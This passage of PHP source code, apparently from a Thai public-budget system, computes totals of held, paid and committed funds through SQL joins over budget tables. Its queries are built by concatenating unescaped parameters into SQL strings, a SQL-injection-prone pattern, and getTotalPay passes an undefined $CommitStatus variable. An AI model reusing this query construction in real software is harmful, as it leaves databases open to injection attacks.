		if($PrjActCode)		{ 	$where[]	= "t2.PrjActCode ='".$PrjActCode."'"; 			}
		if($CostTypeId)	{ 	$where[]	= "t6.CostTypeId ='".$CostTypeId."'"; 			}
		if($CostItemCode){   $where[]	= "t1.CostItemCode ='".$CostItemCode."'"; 	}
		if($FormCode)		{  	$where[]	= "t1.FormCode in(".$FormCode.")"; 			}
		if($SourceType)	{	$where[] = "t1.SourceType ='".$SourceType."'";			}					
		if($SourceExId)	{  	$where[]	= "t1.SourceExId ='".$SourceExId."'"; 			}
		
		$where[] = "t3.ActiveStatus='Y'";
		$where[] = "t3.SCTypeId >= '2'";
		$where[] = "t1.CloseStatus='N'";
		$where[] = "t1.CancelStatus='N'";
		
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		
		$sql="select sum(t1.SumRemain)as total "
				."\n from tblbudget_bg_hold as t1 "
				."\n left join tblbudget_project_activity as t2 on t2.PrjActCode=t1.PrjActCode "
				."\n left join tblbudget_project_detail as t3 on t3.PrjDetailId=t2.PrjDetailId "
				."\n left join tblbudget_project as t4 on t4.PrjCode=t3.PrjCode "
				."\n left join tblbudget_init_cost_item as t5 on t5.CostItemCode=t1.CostItemCode "
				."\n left join tblbudget_init_cost_type as t6 on t6.CostTypeId=t5.CostTypeId "
				."\n".$where_r
				;
				
		$this->db->setQuery($sql); //echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadResult();
		return $datas;
	}
	/*END*/	
	
	/*
	START
	Function Name	: getHoldFormal
	Description			: คำนวณยอดรวมงบหลักการ (งบแผ่นดิน)
	Parameter			: ปีงบประมาณ , แหล่งงบประมาณ(งบแผ่นดิน/เงินนอกงบ) , ประเภทแหล่งเงินนอกงบ , หน่วยงานเจ้าของโครงการ , หน่วยงานผู้ปฏิบัติงานของกิจกรรม , แผนงาน , โครงการ , กิจกรรม , หมวดค่าใช้จ่าย , รายการค่าใช้จ่าย , สถานะปิดกันเงิน
	Return Value 		: ผลรวมยอดหลักการ
	*/	
	function getHoldFormal($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$FormCode=0){
		$FormCode = "'FF008','FF011','FP001','FP002','FC001'";
		$datas = $this->getHold($BgtYear,$SourceType,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,$FormCode);
		return $datas;
	}
	/*END*/	
	
	/* START
	Function Name	: getPay
	Description			: คำนวณยอดรวมงบตัดจ่าย (งบแผ่นดิน)
	Parameter			: ปีงบประมาณ , แหล่งงบประมาณ(งบแผ่นดิน/เงินนอกงบ) , ประเภทแหล่งเงินนอกงบ , หน่วยงานเจ้าของโครงการ , หน่วยงานผู้ปฏิบัติงานของกิจกรรม , แผนงาน , โครงการ , กิจกรรม , หมวดค่าใช้จ่าย , รายการค่าใช้จ่าย , สถานะ Commit
	Return Value 		: ผลรวมยอดตัดจ่ายงบ
	*/	
	function getPay($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$CommitStatus="",$FormCode=0){
		$where = array();
		
		$BgtYear = ($BgtYear)?$BgtYear:(date("Y")+543);
		$where[] = "t1.BgtYear='".$BgtYear."'";
		
		if($OrgOwner)		{ 	$where[]	= "t4.OrganizeCode ='".$OrgOwner."'"; 		}
		if($OrgOperate)	{	$where[]	= "t2.OrganizeCode ='".$OrgOperate."'";		}
		if($PItemCode)		{	$where[]	= "t4.PItemCode ='".$PItemCode."'"; 			}
		if($PrjCode)			{ 	$where[]	= "t4.PrjCode ='".$PrjCode."'"; 						}
		if($PrjActCode)		{ 	$where[]	= "t2.PrjActCode ='".$PrjActCode."'"; 			}
		if($CostTypeId)	{	$where[]	= "t6.CostTypeId ='".$CostTypeId."'"; 			}
		if($CostItemCode){  	$where[]	= "t1.CostItemCode ='".$CostItemCode."'"; 	}
		if($CommitStatus){  	$where[]	= "t1.CommitStatus ='".$CommitStatus."'"; 	}
		if($SourceType)	{	$where[] 	= "t1.SourceType ='".$SourceType."'";		}
		if($SourceExId)	{  	$where[]	= "t1.SourceExId ='".$SourceExId."'"; 			}
		if($FormCode)		{  	$where[]	= "t1.FormCode in(".$FormCode.")"; 			}
		
		$where[] = "t3.ActiveStatus ='Y'";
		$where[] = "t3.SCTypeId >= '2'";
		$where[] = "t1.CancelStatus = 'N'";
		
		if($where){
			$where_r = "\n where ".implode(" and ",$where);
		}
		
		$sql="select sum(t1.SumCost)as total "
				."\n from tblbudget_bg_pay as t1 "
				."\n left join tblbudget_project_activity as t2 on t2.PrjActCode=t1.PrjActCode "
				."\n left join tblbudget_project_detail as t3 on t3.PrjDetailId=t2.PrjDetailId "
				."\n left join tblbudget_project as t4 on t4.PrjCode=t3.PrjCode "
				."\n left join tblbudget_init_cost_item as t5 on t5.CostItemCode=t1.CostItemCode "
				."\n left join tblbudget_init_cost_type as t6 on t6.CostTypeId=t5.CostTypeId "
				."\n".$where_r
				;
		$this->db->setQuery($sql);	//echo "<pre>".$sql."</pre>";
		$datas = $this->db->loadResult();
		return $datas;
	}
	/*END*/	
	
	/* START
	Function Name	: getTotalPay
	Description			: คำนวณยอดรวมงบผูกพัน+งบตัดจ่าย (งบแผ่นดิน)
	Parameter			: ปีงบประมาณ , แหล่งงบประมาณ(งบแผ่นดิน/เงินนอกงบ) , ประเภทแหล่งเงินนอกงบ , หน่วยงานเจ้าของโครงการ , หน่วยงานผู้ปฏิบัติงานของกิจกรรม , แผนงาน , โครงการ , กิจกรรม , หมวดค่าใช้จ่าย , รายการค่าใช้จ่าย
	Return Value 		: ผลรวมยอดผูกพันและตัดจ่ายงบ
	*/	
	function getTotalPay($BgtYear=0,$SourceType="",$SourceExId=0,$OrgOwner=0,$OrgOperate=0,$PItemCode=0,$PrjCode="",$PrjActCode=0,$CostTypeId=0,$CostItemCode=0,$FormCode=""){
		$Chain 	= $this->getChain($BgtYear,$SourceType,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,$FormCode);
		$Pay 		= $this->getPay($BgtYear,$SourceType,$SourceExId,$OrgOwner,$OrgOperate,$PItemCode,$PrjCode,$PrjActCode,$CostTypeId,$CostItemCode,$CommitStatus,$FormCode);
		$Total	= $Chain+$Pay;
		return $Total;
	}	/*END*/
	
	

	//========================== End ตารางสรุปงบประมาณ ============================
		
		
		
		
}// end class